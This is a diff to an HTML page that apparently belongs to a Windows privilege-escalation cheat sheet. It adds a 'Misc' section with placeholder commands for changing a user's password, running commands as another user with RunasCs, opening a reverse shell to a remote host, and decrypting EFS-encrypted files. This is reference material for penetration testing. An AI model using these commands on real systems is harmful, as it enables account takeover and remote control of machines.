@@ -141,7 +141,7 @@
 
   <div>
         <div class="toc col-lg-3 hidden-xs hidden-sm">
-            <div id="toc"><ul><li><a class="toc-href" href="#generic-enumeration" title="Generic Enumeration">Generic Enumeration</a></li><li><a class="toc-href" href="#kernel-exploits" title="Kernel Exploits">Kernel Exploits</a></li><li><a class="toc-href" href="#service-and-tasks-exploits" title="Service and Tasks Exploits">Service and Tasks Exploits</a></li><li><a class="toc-href" href="#registry-exploits" title="Registry Exploits">Registry Exploits</a></li><li><a class="toc-href" href="#dumping-credentials" title="Dumping Credentials">Dumping Credentials</a></li><li><a class="toc-href" href="#applications-exploits" title="Applications Exploits">Applications Exploits</a></li><li><a class="toc-href" href="#potatoes" title="Potatoes">Potatoes</a></li><li><a class="toc-href" href="#misc" title="Misc">Misc</a></li></ul></div>
+            <div id="toc"><ul><li><a class="toc-href" href="#generic-enumeration" title="Generic Enumeration">Generic Enumeration</a></li><li><a class="toc-href" href="#kernel-exploits" title="Kernel Exploits">Kernel Exploits</a></li><li><a class="toc-href" href="#service-and-tasks-exploits" title="Service and Tasks Exploits">Service and Tasks Exploits</a></li><li><a class="toc-href" href="#registry-exploits" title="Registry Exploits">Registry Exploits</a></li><li><a class="toc-href" href="#dumping-credentials" title="Dumping Credentials">Dumping Credentials</a></li><li><a class="toc-href" href="#applications-exploits" title="Applications Exploits">Applications Exploits</a></li><li><a class="toc-href" href="#potatoes" title="Potatoes">Potatoes</a></li><li><a class="toc-href" href="#misc" title="Misc">Misc</a><ul><li><a class="toc-href" href="#efs-encryption" title="EFS Encryption">EFS Encryption</a></li></ul></li></ul></div>
         </div>
     <h2 id="generic-enumeration">Generic Enumeration</h2>
 <p>Run automated checks with various tools:</p>
@@ -435,6 +435,23 @@ LocalPotato.exe -r 127.0.0.1 -u /webdavshare/potato.local
 <h2 id="misc">Misc</h2>
 <p>Add user to local Administrators group:</p>
 <div class="highlight"><pre><span></span><code>net<span class="w"> </span>localgroup<span class="w"> </span>administrators<span class="w"> </span>&lt;user&gt;<span class="w"> </span>/add
+</code></pre></div>
+<p>Change user password:</p>
+<div class="highlight"><pre><span></span><code>net<span class="w"> </span>user<span class="w"> </span>&lt;user&gt;<span class="w"> </span>&lt;new<span class="w"> </span>password&gt;
+</code></pre></div>
+<p>Run command as user with <strong>Full Profile</strong> using <a href="https://github.com/antonioCoco/RunasCs">RunasCs</a>:</p>
+<div class="highlight"><pre><span></span><code>RunasCs.exe<span class="w"> </span>&lt;user&gt;<span class="w"> </span>&lt;password&gt;<span class="w"> </span><span class="s2">"&lt;command&gt;"</span>
+</code></pre></div>
+<p>Open reverse shell with <code>RunasCs</code>:</p>
+<div class="highlight"><pre><span></span><code>RunasCs.exe<span class="w"> </span>&lt;user&gt;<span class="w"> </span>&lt;password&gt;<span class="w"> </span>cmd.exe<span class="w"> </span>-r<span class="w"> </span>&lt;remote<span class="w"> </span>host&gt;:&lt;remote<span class="w"> </span>port&gt;
+</code></pre></div>
+<h3 id="efs-encryption">EFS Encryption</h3>
+<p>See <a href="https://ojack69.github.io/jacks-corner/privilege-escalation/windows-privilege-escalation.html#efs-encryption">Windows Privilege Escalation - EFS Encryption</a>.</p>
+<p>Decrypt the file:</p>
+<div class="highlight"><pre><span></span><code>cipher<span class="w"> </span>/d<span class="w"> </span><span class="s2">"&lt;path to encrypted file&gt;"</span>
+</code></pre></div>
+<p>You can also decrypt a whole folder:</p>
+<div class="highlight"><pre><span></span><code>cipher<span class="w"> </span>/d<span class="w"> </span>/s:<span class="s2">"&lt;path to encrypted files folder&gt;"</span>
 </code></pre></div>
   </div>
   <div class="tag-cloud">
